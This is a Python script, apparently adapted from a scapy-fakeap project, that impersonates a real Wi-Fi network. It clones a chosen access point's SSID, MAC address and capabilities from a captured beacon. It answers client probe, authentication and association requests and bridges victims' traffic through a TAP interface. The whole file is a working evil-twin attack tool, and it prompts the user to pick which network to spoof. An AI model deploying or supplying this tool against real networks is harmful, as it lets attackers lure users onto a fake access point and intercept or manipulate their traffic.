"""
This script sets up a fake access point using Scapy and a TAP interface.
It allows the creation of custom beacon frames and manages client interactions.

Inspiration and code snippets were adapted from:
https://github.com/rpp0/scapy-fakeap
"""

import os
import struct
import fcntl
import threading
import time
from scapy.all import Ether, Dot11, RadioTap, Dot11Beacon, Dot11Elt, Dot11Auth, Dot11AssoResp, LLC, sendp, sniff, SNAP
from scapy.all import *
from time import sleep



# Flag to indicate that a TAP (Ethernet Layer 2) interface should be created.
IFF_TAP = 0x0002  
# Flag to disable packet information (PI) headers, ensuring raw packets are read/written.
IFF_NO_PI = 0x1000  
# ioctl command to set the interface properties (e.g., TUN or TAP, name, etc.).
TUNSETIFF = 0x400454ca  
# Maximum Transmission Unit (MTU) size for 802.11 (Wi-Fi) frames, set to the standard 1500 bytes.
DOT11_MTU = 1500  

boottime = time.time()
sc = 0
aid = 0

tap_iface_name = "at0"
tap_ip_address = "10.0.0.1"

class State():
    def __init__(self):
        self.auth = 0
        self.asso = 0

def current_timestamp():
    return int((time.time() - boottime) * 1000000)

def next_sc():
    global sc
    sc = (sc + 1) % 4096
    return sc * 16

def next_aid():
    global aid
    aid = (aid + 1) % 2008
    return aid * 16

def beacon():
    """Create the beacon frame"""
    
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=target_frame.addr3, addr3=target_frame.addr3)
    beacon = Dot11Beacon(cap=str(target_frame[Dot11Beacon].cap))
    essid = Dot11Elt(ID="SSID", info=(target_frame.info).decode(), len=len((target_frame.info).decode()))

    frame =  RadioTap()/dot11/beacon/essid/Dot11EltDSSSet(ID=3, len=1, channel=target_frame.channel) 
    if target_frame.haslayer(Dot11EltCountry):
        frame = frame /Dot11EltCountry(ID=7,len=6, country_string=target_frame[Dot11EltCountry].country_string, descriptors=target_frame[Dot11EltCountry].descriptors)
    
    frame = frame/Dot11EltRates(ID=1, len=len(target_frame[Dot11Elt].rates), rates=target_frame[Dot11Elt].rates)
    try:
        frame = frame/Dot11EltRates(ID=50, len=len(target_frame.getlayer(Dot11Elt,ID=50).rates), rates=target_frame.getlayer(Dot11Elt,ID=50).rates) 
    except:
        pass
    
    if target_frame.haslayer(Dot11EltHTCapabilities):
        frame = frame/target_frame[Dot11EltHTCapabilities]
    

    frame[Dot11Beacon].timestamp = current_timestamp()
    frame.SC = next_sc()
    sendp(frame, iface=iface_name, verbose=0)

def create_access_point():
    def broadcast_beacons():
        while True:
            beacon()
            sleep(0.01)

    beacon_thread = threading.Thread(target=broadcast_beacons)
    beacon_thread.daemon = True
    beacon_thread.start()


def setup_tap_interface(name, ip, mac):
    """Set up the TAP interface."""

    fd = os.open("/dev/net/tun", os.O_RDWR)
    ifr_flags = IFF_TAP | IFF_NO_PI
    ifreq = struct.pack("16sH", name.encode('ascii'), ifr_flags)
    fcntl.ioctl(fd, TUNSETIFF, ifreq)
    
    os.system(f"ip link set dev {name} up")
    
    os.system(f"ip addr add {ip}/24 dev {name}")
    
    os.system(f"ip link set dev {name} address {mac}")
    
    print(f"Created TAP interface {name} at {ip} with MAC {mac}.")
    return fd


class TapInterface(threading.Thread):
    def __init__(self, ip=None, mac=None, name="at0"):
        threading.Thread.__init__(self)

        self.name = name
        self.ip = ip
        self.mac = mac
        self.daemon = True

        self.fd = setup_tap_interface(name, ip, mac)

    def write(self, pkt):
        """Write a packet to the TAP interface."""

        os.write(self.fd, pkt)

    def read(self):
        """Read a packet from the TAP interface."""

        try:
            raw_packet = os.read(self.fd, DOT11_MTU)
            return raw_packet
        except Exception as e:
            print(f"Error reading from TAP interface: {e}")
            return None

    def close(self):
        """Close the TAP interface."""

        os.close(self.fd)

    def run(self):
        """Thread run method to continuously read packets."""

        while True:
            raw_packet = self.read()
            if raw_packet:
                eth = Ether(raw_packet)
                dot11 = RadioTap(
                    version=0,                      # Radiotap version
                    pad=0,                          # Padding (usually set to 0)
                    len=18,                         # 18 Total length of the Radiotap header
                    present='Flags+Rate+Channel+dBm_AntSignal+Antenna+RXFlags',
                    Flags=0,                        # Set flags if needed, such as FCS presence (FCS=0 or 1)
                    Rate=11.0,                      # Data rate in Mbps
                    ChannelFrequency=2462,          # Channel frequency in MHz (e.g., 2462 for channel 11)
                    ChannelFlags='CCK+2GHz',        # Channel flags (e.g., CCK for 2.4GHz channels)
                    dBm_AntSignal=-19,              # Signal strength (e.g., -19 dBm)
                    Antenna=0,                      # Antenna index (0 for the first antenna)
                    RXFlags=0                       # Receiver flags
                ) / Dot11(type=2, subtype=0,        # type=2 means data
                    addr1=eth.dst,                  # Destination MAC
                    addr2=eth.src,                  # Source MAC
                    addr3=target_frame.addr3,       # Access Point MAC
                    FCfield="from-DS",
                    SC = next_sc()
                ) / LLC(
                    dsap=0xAA, ssap=0xAA, ctrl=3
                ) / SNAP(
                    OUI=0
                ) / eth.payload
                
                sendp(dot11, iface=iface_name, verbose=0)

def forward_to_tap(pkt):
    """Forward packets from the WiFi interface to the TAP interface."""

    if pkt.type == 2:
        if pkt.haslayer(LLC):
            if pkt.haslayer(SNAP):
                payload = pkt[SNAP].payload
            else:
                payload = pkt[LLC].payload
        else:
            payload = pkt.payload

        src_mac = pkt.addr2
        
        eth_frame = Ether(src=src_mac, dst=target_frame.addr3) / payload

        tap_interface.write(bytes(eth_frame))

def handle_probe_req(pkt):
    """Answer to probe request with probe response"""

    resp = RadioTap() / Dot11(type=0, subtype=5,
        addr1=pkt.addr2,
        addr2=target_frame.addr3,
        addr3=target_frame.addr3,
        SC=next_sc()
    ) / Dot11ProbeResp(
        cap=str(target_frame[Dot11Beacon].cap)
    ) / Dot11Elt(
        ID="SSID", info=(target_frame.info).decode(), len=len((target_frame.info).decode())
    ) / Dot11EltRates(
        ID=1, len=len(target_frame[Dot11Elt].rates), rates=target_frame[Dot11Elt].rates
    ) 
    
    try:
        resp = resp/Dot11EltRates(ID=50, len=len(target_frame.getlayer(Dot11Elt,ID=50).rates), rates=target_frame.getlayer(Dot11Elt,ID=50).rates) 
    except:
        pass


    sendp(resp, iface=iface_name, verbose=0)

def handle_authentication_req(pkt):
    """Answer to authentication request with authentication response"""

    resp = RadioTap() / Dot11(
        addr1=pkt.addr2,
        addr2=pkt.addr1,
        addr3=pkt.addr1,
        SC=next_sc()
    ) / Dot11Auth(seqnum=2)

    sendp(resp, iface=iface_name, verbose=0)

def handle_association_req(pkt, reassoc):
    """Answer to association request with association response"""

    response_subtype = 0x01
    if reassoc:
        response_subtype = 0x03
    resp = RadioTap() / Dot11(
        subtype=response_subtype,
        addr1=pkt.addr2,
        addr2=pkt.addr1,
        addr3=pkt.addr1
    ) / Dot11AssoResp(
        cap=str(target_frame[Dot11Beacon].cap), status=0, AID=next_aid()
    ) / Dot11Elt(
        ID="SSID", info=(target_frame.info).decode(), len=len((target_frame.info).decode())
    ) / Dot11EltRates(
        ID=1, len=len(target_frame[Dot11Elt].rates), rates=target_frame[Dot11Elt].rates
    )

    sendp(resp, iface=iface_name, verbose=0)


def handle_packets(pkt):
    if pkt.haslayer(Dot11):
        if pkt.type == 0:   # Management frame
            if pkt.subtype == 4 and (pkt.info == (target_frame.info).decode() or pkt.info == b''):        # Probe requests
                handle_probe_req(pkt)
            if pkt.subtype == 11 and pkt.addr1 == target_frame.addr3:       # Authentications
                if pkt.addr2 not in clients:
                    clients[pkt.addr2] = State()
                    clients[pkt.addr2].auth = pkt.SC
                    handle_authentication_req(pkt)
                elif clients[pkt.addr2].auth != pkt.SC:
                    clients[pkt.addr2].auth = pkt.SC
                    handle_authentication_req(pkt)
            elif (pkt.subtype == 0 or pkt.subtype == 2) and pkt.addr1 == target_frame.addr3 and pkt.info == target_frame.info:      # Association requests
                if clients[pkt.addr2].auth and clients[pkt.addr2].asso != pkt.SC:
                    clients[pkt.addr2].asso = pkt.SC
                    handle_association_req(pkt, pkt.subtype)

        elif pkt.type ==2 and pkt.addr1 == target_frame.addr3:       # Data frame
            forward_to_tap(pkt)


dict_beacon= {}
def parse(frame):
    if frame.haslayer(Dot11) and frame.type==0 and frame.subtype==8 and (frame.info).decode('utf-8') not in dict_beacon:
        ssid=(frame.info).decode()
        dict_beacon[ssid] = frame

if __name__ == "__main__":
    try:
        file=sys.argv[1]
        iface_name=sys.argv[2]
    except:
        print("Error: need a pcap file with beacon frame and an interface")
        print("Example:")
        print("sudo python3 ap.py file.pcap wlan0")
        sys.exit(0)
    sniff(offline=file, prn=parse)


    choice = []
    for i, ssid in enumerate(dict_beacon):
        print(i, ssid)
        choice.append(ssid)
    nbr = int(input("Which AP you want to spoof (enter the number):"))

    target_frame = dict_beacon[choice[nbr]]

    clients = {}
    tap_interface = TapInterface(ip=tap_ip_address, mac=target_frame.addr3, name=tap_iface_name)
    tap_interface.start()

    create_access_point()
    sniff(iface=iface_name, prn=handle_packets, store=0)
